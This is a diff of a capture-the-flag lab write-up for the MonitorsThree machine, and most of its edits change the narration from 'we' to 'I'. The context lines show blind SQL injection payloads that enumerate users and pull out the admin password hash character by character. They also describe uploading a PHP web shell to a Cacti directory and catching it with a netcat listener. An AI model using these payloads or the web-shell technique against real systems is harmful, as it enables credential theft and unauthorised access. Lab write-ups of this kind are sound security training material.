@@ -49,14 +49,16 @@ there is a login page in monitorsthree.htb/login.php, and when using forgot pass
 ### Part 2: Foothold
 
 by submitting : `'order by 3--+`
-till it gives error, from error we can see that it uses mariadb or we can use:
+till it gives error, from error I can see that it uses mariadb.
+When I use nine column:
 
 <span style="color: red;">
 ad'union select null,null,null,null,null,null,null,null,null from dual--
 </span>
 
-when we query nine column it says successfully sent request code, so we should use nine column from now in our sql query.
-by submitting
+it says successfully sent request code, so I know that query is returning nine column.
+
+By submitting,
 
 <span style="color: red;">ad'||(SELECT '' FROM table)||'</span>
 
@@ -68,7 +70,7 @@ gives successful output
 
 ![NMAP](/static/writeups/monitors/5.png)
 
-now we know there is a table called users.
+now I know there is a table called users.
 To enumerate user, i first used username administrator
 
 <span style="color: red;">ad' ||((SELECT 'a' FROM users WHERE username='administrator')='a')||'</span>
@@ -77,7 +79,7 @@ this gives error: 'Unable to process request, try again!'
 
 ![NMAP](/static/writeups/monitors/4.png)
 
-but as when we input admin:
+but as when I input admin:
 
 <span style="color: red;">ad' ||((SELECT 'a' FROM users WHERE username='admin')='a')||'</span>
 
@@ -85,7 +87,7 @@ it outputs: 'Successfully sent password reset request!'
 
 ![NMAP](/static/writeups/monitors/5.png)
 
-so, we know there is user called admin now.
+so, I know there is user called admin now. Now, to enumerate password first i need to find length of the password so i can design payload accordingly.
 
 <span style="color: red;">ad' ||((SELECT 'a' FROM users WHERE username='admin' and length(password)=32)='a')||'</span>
 
@@ -98,7 +100,7 @@ ad' ||(SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='3'||'
 ad' ||(SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='1'||'
 </span>
 
-As it returns successful message back like this, we found first and second character of hash but it is time consuming so i decided to do it with python script:
+As it returns successful message back like this, I found first and second character of hash but it is time consuming so i decided to do it with python script:
 
 ```
 
@@ -211,7 +213,7 @@ save this as shell.php and run it using `php shell.php`, it will generate file c
 
 ![NMAP](/static/writeups/monitors/9.png)
 
-As you can see, we successfully uploaded shell.php in the machine, we can execute it by going to: `http://cacti.monitorsthree.htb/cacti/resource/shell.php`
+As you can see, I successfully uploaded shell.php in the machine, I can execute it by going to: `http://cacti.monitorsthree.htb/cacti/resource/shell.php`
 before that open netcat listener in your machine: `nc -nvlp port`
 I got shell as www-data using this method.
 
